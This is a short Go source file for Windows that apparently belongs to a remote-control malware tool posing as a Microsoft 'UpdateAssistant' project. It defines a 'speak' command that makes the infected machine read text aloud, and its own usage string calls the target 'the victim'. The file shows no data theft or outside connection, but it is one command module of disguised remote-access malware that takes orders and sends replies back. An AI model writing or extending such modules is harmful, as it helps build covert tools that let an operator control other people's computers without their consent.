//go:build windows

package media

import (
	"github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var speakUsage = []string{
	"speak <text> — speaks text aloud on the victim",
}

func Speak(c *ipc.Context) error {
	text := c.ArgString()
	if text == "" {
		return c.Usage(speakUsage)
	}
	go func() {
		if sysutil.Speak(text) {
			c.Reply("speaking")
		} else {
			c.Reply("failed")
		}
	}()
	return nil
}
